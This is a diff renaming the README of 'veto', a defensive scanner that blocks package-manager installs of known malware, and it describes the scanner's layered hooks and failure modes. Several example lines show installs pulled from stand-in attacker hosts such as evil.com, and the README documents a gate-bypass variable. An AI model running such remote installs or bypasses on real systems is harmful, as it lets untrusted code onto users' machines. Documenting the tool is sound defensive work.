@@ -1,4 +1,4 @@
-# package-bouncer
+# veto
 
 A command-level malware scanner for package managers. Aggregates intel
 from four upstream feeds (Aikido, OpenSSF malicious-packages, OSV,
@@ -20,7 +20,7 @@ npm install chai-as-upgraded                                  # bare name
 /opt/homebrew/bin/npm install chai-as-upgraded                # absolute path
 ~/.local/share/mise/installs/node/24.7.0/bin/npm install …    # mise install dir
 npm install https://example.com/evil.tgz                      # opaque tarball URL
-bouncer npm ci  # against a lockfile naming a flagged package # transitive coverage
+veto npm ci  # against a lockfile naming a flagged package # transitive coverage
 
 # Python subprocess.run with absolute path AND stripped env — the case
 # agents do constantly:
@@ -34,32 +34,32 @@ the upstream feed recorded — the gate refuses on package name.
 ## Quick install (60 seconds)
 
 ```sh
-git clone https://github.com/brynbellomy/package-bouncer.git
-cd package-bouncer
-make install                                # builds → ~/.local/bin/bouncer
-make interposer                             # builds libbouncer_interpose.dylib
-bouncer sync                                # first-time intel fetch (~10s)
+git clone https://github.com/brynbellomy/veto.git
+cd veto
+make install                                # builds → ~/.local/bin/veto
+make interposer                             # builds libveto_interpose.dylib
+veto sync                                # first-time intel fetch (~10s)
 
 # Layer 2 — PATH shims (any agent shell)
-bouncer install-shims
+veto install-shims
 
 # Layer 1 — Claude Code Bash hook (if you use Claude Code)
-bouncer install-claude-hook
+veto install-claude-hook
 
 # Layer 3 — native execve interposer (closes subprocess.run([abs_path]))
-bouncer install-preload --lib $(pwd)/libbouncer_interpose.dylib --shell-rc auto
+veto install-preload --lib $(pwd)/libveto_interpose.dylib --shell-rc auto
 
 # Layer 4 — real-binary wrappers (the strongest layer; wraps homebrew/mise binaries)
-bouncer install-wrappers
+veto install-wrappers
 
 # Verify
-bouncer doctor
+veto doctor
 ```
 
 Then `source ~/.zshrc` (or open a new terminal) for the interposer env
 vars to take effect.
 
-If `bouncer doctor` shows mise shadowing the Layer 2 shims, see
+If `veto doctor` shows mise shadowing the Layer 2 shims, see
 [mise PATH ordering](#mise-path-ordering) below.
 
 ## Defense layers
@@ -70,16 +70,16 @@ agent-bash threat surface.
 
 | # | Layer | Catches | Install |
 |---|---|---|---|
-| 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `bouncer install-claude-hook` |
-| 2 | PATH shims (`~/.local/bin/{npm,pip,…}`) | bare-name PM invocations in any shell that inherits the user's PATH | `bouncer install-shims` |
-| 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `bouncer install-preload --lib ./libbouncer_interpose.{dylib,so}` |
-| 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `bouncer install-wrappers` |
+| 1 | Claude Code PreToolUse hook | Bash tool calls inside a Claude session, before the shell sees them | `veto install-claude-hook` |
+| 2 | PATH shims (`~/.local/bin/{npm,pip,…}`) | bare-name PM invocations in any shell that inherits the user's PATH | `veto install-shims` |
+| 3 | Native execve interposer (`DYLD_INSERT_LIBRARIES` / `LD_PRELOAD`) | absolute-path invocations and `subprocess.run([abs])` in processes that inherit the preload env var | `veto install-preload --lib ./libveto_interpose.{dylib,so}` |
+| 4 | Real-binary wrappers | absolute-path invocations even when env vars are stripped — the dylib doesn't need to load | `veto install-wrappers` |
 
 Layer 4 is the strongest single layer because it requires no env-var
 inheritance and no process cooperation — the bytes at
-`/opt/homebrew/bin/npm` *are* bouncer. The tradeoff: `brew upgrade
+`/opt/homebrew/bin/npm` *are* veto. The tradeoff: `brew upgrade
 node` or `mise install node@whatever` overwrites the wrapper. Re-run
-`bouncer install-wrappers` after toolchain upgrades; `bouncer doctor`
+`veto install-wrappers` after toolchain upgrades; `veto doctor`
 flags drift.
 
 ## Why this design
@@ -98,7 +98,7 @@ fails open in several real-world cases:
 - the call uses an absolute path (`subprocess.run(["/opt/homebrew/bin/npm",
   …], shell=False)`) — agents do this constantly.
 
-`bouncer` operates at the command layer: it parses argv, looks up
+`veto` operates at the command layer: it parses argv, looks up
 package names against an aggregated malware database, and refuses or
 passes through. Because the check happens before the package manager
 runs, none of the failure modes above apply.
@@ -126,7 +126,7 @@ packagemanager/
 gate/              ← decision logic (allow / refuse / passthrough / abort)
 internal/hook/     ← Claude Code analyzer (Layer 1)
 internal/interposer/  ← native execve/posix_spawn hooks in C (Layer 3)
-cmd/bouncer/       ← CLI entrypoint
+cmd/veto/       ← CLI entrypoint
 hooks/             ← per-agent integration docs
 ```
 
@@ -140,16 +140,16 @@ didn't sample.
 
 **Transitive coverage via lockfiles.** When an install verb runs in a
 project with a lockfile (`package-lock.json`, `pnpm-lock.yaml`,
-`yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`), bouncer parses the
+`yarn.lock`, `uv.lock`, `poetry.lock`, `pdm.lock`), veto parses the
 full resolved transitive tree and gates every (name, version) tuple in
 it — not just the verb's explicit argv. This is the only way to catch
 a flagged transitive dep that's been pinned into the lockfile without
 running the resolver ourselves.
 
 **Fail-closed defaults.** Per-source malware feeds are fetched
-concurrently with etag-based caching in `~/.cache/package-bouncer/`.
+concurrently with etag-based caching in `~/.cache/veto/`.
 On network outage the last good snapshot is used; if zero sources
-succeed on the very first run, the bouncer refuses installs rather
+succeed on the very first run, the veto refuses installs rather
 than fail open. A sanity floor of 1000 reports total catches the
 "every feed returned []" case loudly.
 
@@ -157,42 +157,42 @@ than fail open. A sanity floor of 1000 reports total catches the
 
 ```sh
 # Gate an install (same shape as safe-chain's CLI).
-bouncer npm install lodash         # → exec real npm
-bouncer npm install chai-as-upgraded
-# bouncer: install refused — malware intelligence flagged the following:
+veto npm install lodash         # → exec real npm
+veto npm install chai-as-upgraded
+# veto: install refused — malware intelligence flagged the following:
 #   - chai-as-upgraded@<any> (ecosystem: npm)
 #       [aikido] MALWARE
 
 # Refresh malware intel manually.
-bouncer sync
+veto sync
 
 # Show source health and cache location.
-bouncer status
+veto status
 
 # Verify all defense layers and intel state — run after any install.
-bouncer doctor
+veto doctor
 ```
 
-`bouncer help` lists every subcommand grouped by layer.
+`veto help` lists every subcommand grouped by layer.
 
 ### Environment
 
 | Variable | Default | Purpose |
 |---|---|---|
-| `BOUNCER_CACHE_DIR` | `$XDG_CACHE_HOME/package-bouncer` | where intel snapshots live |
-| `BOUNCER_SOURCES` | `aikido,openssf,osv,pypa` | comma-separated source IDs to enable |
-| `BOUNCER_LOG` | (info) | set `debug` for verbose logging |
-| `BOUNCER_BYPASS` | (unset) | prepend `BOUNCER_BYPASS=1 ` to skip the gate for one invocation |
-| `BOUNCER_ALLOW_OPAQUE` | `0` | set `1` to opt URL/git/tarball installs through the gate (refused by default) |
-| `BOUNCER_PATH` | (set by install-preload) | consumed by the Layer 3 interposer |
+| `VETO_CACHE_DIR` | `$XDG_CACHE_HOME/veto` | where intel snapshots live |
+| `VETO_SOURCES` | `aikido,openssf,osv,pypa` | comma-separated source IDs to enable |
+| `VETO_LOG` | (info) | set `debug` for verbose logging |
+| `VETO_BYPASS` | (unset) | prepend `VETO_BYPASS=1 ` to skip the gate for one invocation |
+| `VETO_ALLOW_OPAQUE` | `0` | set `1` to opt URL/git/tarball installs through the gate (refused by default) |
+| `VETO_PATH` | (set by install-preload) | consumed by the Layer 3 interposer |
 
 ### Refuse-opaque-by-default
 
 `npm install https://evil.com/foo.tgz`, `pip install
 git+https://evil.com/repo`, and `bun install user/repo` (npm's GitHub
 shorthand) all bypass the package-registry name lookup — there's no
-name to look up against. Bouncer's default policy refuses these
-outright with a `[bouncer-policy]` source marker so they're
+name to look up against. Veto's default policy refuses these
+outright with a `[veto-policy]` source marker so they're
 distinguishable from a malware-feed-driven block. Filesystem-path
 specs (`./pkg`, `/abs/path`) still pass through — they don't pull
 remote code on their own.
@@ -205,21 +205,21 @@ Layer 2 shims to win, `~/.local/bin` must come AFTER mise activate:
 ```sh
 # ~/.zshrc
 eval "$(mise activate zsh)"             # mise prepends ITS dirs
-export PATH="$HOME/.local/bin:$PATH"    # then bouncer takes the front
+export PATH="$HOME/.local/bin:$PATH"    # then veto takes the front
 ```
 
 If mise's `chpwd` hook re-prepends and undoes the reorder on every
 `cd`, add this precmd to pin the order:
 
 ```sh
-_bouncer_pin_path() { case ":$PATH:" in
+_veto_pin_path() { case ":$PATH:" in
   ":$HOME/.local/bin:"*) ;;
   *) PATH="$HOME/.local/bin:${PATH//$HOME\/.local\/bin:/}" ;;
 esac }
-precmd_functions+=(_bouncer_pin_path)
+precmd_functions+=(_veto_pin_path)
 ```
 
-`bouncer doctor` detects mise (and asdf, pyenv, nvm) install dirs that
+`veto doctor` detects mise (and asdf, pyenv, nvm) install dirs that
 shadow Layer 2 shims and emits this recipe inline in the failure
 output.
 
@@ -236,7 +236,7 @@ these):
   refused — malware intelligence flagged …"
 - **Opaque-spec install** (URL / git / tarball / `user/repo`
   github-shorthand): refused by default → exit 1,
-  `[bouncer-policy]` source. Set `BOUNCER_ALLOW_OPAQUE=1` to opt in
+  `[veto-policy]` source. Set `VETO_ALLOW_OPAQUE=1` to opt in
   after independently verifying the source.
 - **Intel store cannot refresh** (every source failed, no cache):
   exit 70, "INTERNAL ERROR — intel refresh failed"
@@ -249,20 +249,20 @@ these):
 - **Claude Code hook crashes** (parser bug, malformed input): hook
   emits a "deny" with "INTERNAL ERROR in hook script"; if even that
   fails, exits 2 which Claude Code treats as a blocking error
-- **Claude Code hook detects bouncer binary missing on PATH**: hook
+- **Claude Code hook detects veto binary missing on PATH**: hook
   denies with a hard "DO NOT retry" message naming the mis-install
 
-**Known limitations** (what bouncer cannot protect against):
+**Known limitations** (what veto cannot protect against):
 
 - **SIP-protected binaries on macOS** (`/usr/bin/pip3`,
   `/usr/bin/python3 -m pip …`). `DYLD_INSERT_LIBRARIES` is stripped
   by dyld for `/usr/bin/*` and `/System/...`; the dir is also
   read-only so Layer 4 wrappers can't be installed there. Out of
-  bouncer's reach by design — it's a command-layer scanner, not a
+  veto's reach by design — it's a command-layer scanner, not a
   kernel-level interposer.
 - **Toolchain upgrades wiping Layer 4 wrappers**. `brew upgrade node`
-  re-installs the real npm binary on top of our symlink. `bouncer
-  doctor` flags this; re-run `bouncer install-wrappers --force` after
+  re-installs the real npm binary on top of our symlink. `veto
+  doctor` flags this; re-run `veto install-wrappers --force` after
   upgrades.
 - **Compromised upstream returning near-empty feeds**. The 1000-report
   floor catches the worst case (literally empty), but a feed that
@@ -273,9 +273,9 @@ these):
 
 ### Verifying your install
 
-Run `bouncer doctor` in a fresh terminal. It checks:
+Run `veto doctor` in a fresh terminal. It checks:
 
-- `bouncer` resolves on PATH and is executable.
+- `veto` resolves on PATH and is executable.
 - The shim directory is on PATH, and each PM shim wins the PATH
   lookup (no mise/homebrew binary shadowing it earlier). If a mise
   shadow is detected, the recipe to fix it appears inline in the
@@ -283,8 +283,8 @@ Run `bouncer doctor` in a fresh terminal. It checks:
 - The Claude Code Bash hook is wired in `~/.claude/settings.json`.
 - The native interposer env vars are exported and the library file
   exists.
-- Layer 4 wrappers — every recorded wrapper still points at bouncer
-  and its `.bouncer-original` sibling is intact.
+- Layer 4 wrappers — every recorded wrapper still points at veto
+  and its `.veto-original` sibling is intact.
 - The intel store is above the 1000-report sanity floor and was
   refreshed in the last 24 hours.
 
